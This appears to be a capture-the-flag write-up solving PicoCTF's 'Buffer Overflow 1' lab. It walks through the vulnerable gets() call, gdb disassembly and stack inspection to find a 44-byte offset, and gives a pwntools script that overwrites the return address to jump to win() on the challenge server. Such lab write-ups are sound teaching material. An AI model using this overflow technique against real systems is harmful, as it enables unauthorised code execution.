+++
title = "Low Level Binary Intro - Buffer Overflow 1"

+++

This writeup is for the final challenge in the PicoCTF Low Level Binary Intro series:

- [Binary](https://artifacts.picoctf.net/c/187/vuln)
- [Source Code](https://artifacts.picoctf.net/c/187/vuln.c)

We are given both the source code and the binary, which makes this lab quite straightforward. From the source code:

```c
#define BUFSIZE 32
void win() { ... }

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){
  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

we see that we can exploit the stdio library ``gets()`` function by writing more than 32 (``BUFSIZE``) characters into the buffer ``buf`` within the ``vuln()`` function. The program is nice enough to even tell us ``vuln()``'s the return pointer during execution, so the lazy solution would be to bruteforce the padding between the buffer and the return address without using gdb.

Let us check the expected return address in gdb:

```gdb
info functions

0x080491f6  win
0x08049281  vuln
0x080492c4  main

disas main
[SNIP]
0x0804932a <+102>:   call   0x8049281 <vuln>
0x0804932f <+107>:   mov    eax,0x0
0x08049334 <+112>:   lea    esp,[ebp-0x8]
0x08049337 <+115>:   pop    ecx
0x08049338 <+116>:   pop    ebx
0x08049339 <+117>:   pop    ebp
0x0804933a <+118>:   lea    esp,[ecx-0x4]
0x0804933d <+121>:   ret
```

Running the program normally should print the address of ``<main>+107``, i.e., the saved ``rip`` before calling ``vuln()``. 

```bash
./vuln
# Please enter your string:
# foo
# Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

We want to replace this address with the address of ``win()`` (``0x080491f6``). Let us first find the original return address (``0x0804932f``) in memory:

```gdb
disas vuln

[SNIP]
0x08049291 <+16>:    add    ebx,0x2d6f
0x08049297 <+22>:    sub    esp,0xc
0x0804929a <+25>:    lea    eax,[ebp-0x28]
0x0804929d <+28>:    push   eax
0x0804929e <+29>:    call   0x8049050 <gets@plt>
0x080492a3 <+34>:    add    esp,0x10
[SNIP]
```

We set a breakpoint directly after the ``gets()`` call (``<vuln>+34``) with ``b *vuln+34``. Then, we run and input 32 ``A``'s, so we can also see the buffer dimension. At the breakpoint, we inspect the first 80 bytes in memory from stack the stack pointer (``$esp``).

![Stack View](/images/picoctf/picoctf_bufferoverflow.png)

Notice the little endianness. 


The buffer is clearly visible from the 32 A (``0x41``) characters from address ``0xffffd320`` to ``0xffffd33f`` (highlighted red). Knowing x86 processors store in little endian, we also find the return address from address ``0xffffd34c`` to ``0xffffd34f``. We can calculate our input from the image:

```
((Buffer) 32 bytes + 12 bytes) * A + 0xf6 + 0x91 + 0x04 + 0x08
```

We generate the exploiting input:

```python
from pwn import *

payload = 44 * b"\x41" + b"\xf6\x91\x04\x08"
conn = remote("saturn.picoctf.net", 49348)
conn.recvuntil(b"Please enter your string: ", drop=True)

conn.sendline(payload)
print(conn.recvline(timeout=1))
print(conn.recvline(timeout=1))
print(conn.recvline(timeout=1))
conn.close()
```

And receive the flag:

![Flag](/images/picoctf/picoctf_bufferoverflow_flag.png)









